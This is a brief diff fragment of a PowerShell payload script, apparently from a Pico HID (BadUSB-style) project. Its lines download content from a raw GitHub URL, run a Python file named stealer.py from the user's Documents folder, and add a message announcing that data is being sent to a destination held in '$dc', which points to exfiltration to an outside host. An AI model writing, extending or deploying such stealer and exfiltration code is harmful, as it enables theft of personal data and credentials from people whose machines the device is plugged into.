@@ -8,6 +8,8 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Script
 
 & $env:LocalAppData\Programs\Python\Python311\python.exe $Env:USERPROFILE\Documents\stealer.py
 
+Write-Host "Sending data to $dc"
+
 
 
 $user = $env:USERNAME
